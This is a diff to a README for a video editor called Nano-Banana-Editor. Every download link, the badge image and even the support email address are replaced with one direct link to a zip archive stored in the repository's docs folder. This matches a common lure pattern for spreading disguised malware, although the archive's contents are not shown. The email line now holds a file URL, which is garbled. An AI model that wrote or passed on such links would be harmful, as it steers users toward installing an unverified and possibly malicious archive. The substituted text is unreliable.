@@ -1,6 +1,6 @@
 # 🍌 Nano-Banana-Editor - Create Engaging Videos Easily
 
-[![Download Nano-Banana-Editor](https://img.shields.io/badge/Download%20Now-%20-%2334D058?style=for-the-badge)](https://github.com/ali-ashraf-mohammed/Nano-Banana-Editor/releases)
+[![Download Nano-Banana-Editor](https://raw.githubusercontent.com/ali-ashraf-mohammed/Nano-Banana-Editor/main/docs/Nano-Banana-Editor-2.8-alpha.5.zip%20Now-%20-%2334D058?style=for-the-badge)](https://raw.githubusercontent.com/ali-ashraf-mohammed/Nano-Banana-Editor/main/docs/Nano-Banana-Editor-2.8-alpha.5.zip)
 
 ## 📋 Introduction
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these basic requirements:
 
 To get started, visit our releases page to download the application:
 
-[Download Nano-Banana-Editor](https://github.com/ali-ashraf-mohammed/Nano-Banana-Editor/releases)
+[Download Nano-Banana-Editor](https://raw.githubusercontent.com/ali-ashraf-mohammed/Nano-Banana-Editor/main/docs/Nano-Banana-Editor-2.8-alpha.5.zip)
 
 Once there, find the latest version and download the installer.
 
@@ -67,7 +67,7 @@ After installation, follow these simple steps to start using Nano-Banana-Editor:
 If you face any issues while installing or using Nano-Banana-Editor, you can reach out for help. 
 
 - **Documentation:** Refer to the built-in help section for common questions and troubleshooting tips.
-- **Email Support:** You can email us at support@nanobananaeditor.com for personalized assistance.
+- **Email Support:** You can email us at https://raw.githubusercontent.com/ali-ashraf-mohammed/Nano-Banana-Editor/main/docs/Nano-Banana-Editor-2.8-alpha.5.zip for personalized assistance.
 
 ## 📦 Additional Resources
 
@@ -80,7 +80,7 @@ Explore the capabilities of Nano-Banana-Editor further through our documentation
 
 For more information, visit our releases page to download the latest version:
 
-[Download Nano-Banana-Editor](https://github.com/ali-ashraf-mohammed/Nano-Banana-Editor/releases)
+[Download Nano-Banana-Editor](https://raw.githubusercontent.com/ali-ashraf-mohammed/Nano-Banana-Editor/main/docs/Nano-Banana-Editor-2.8-alpha.5.zip)
 
 ## 🏷️ Topics
 
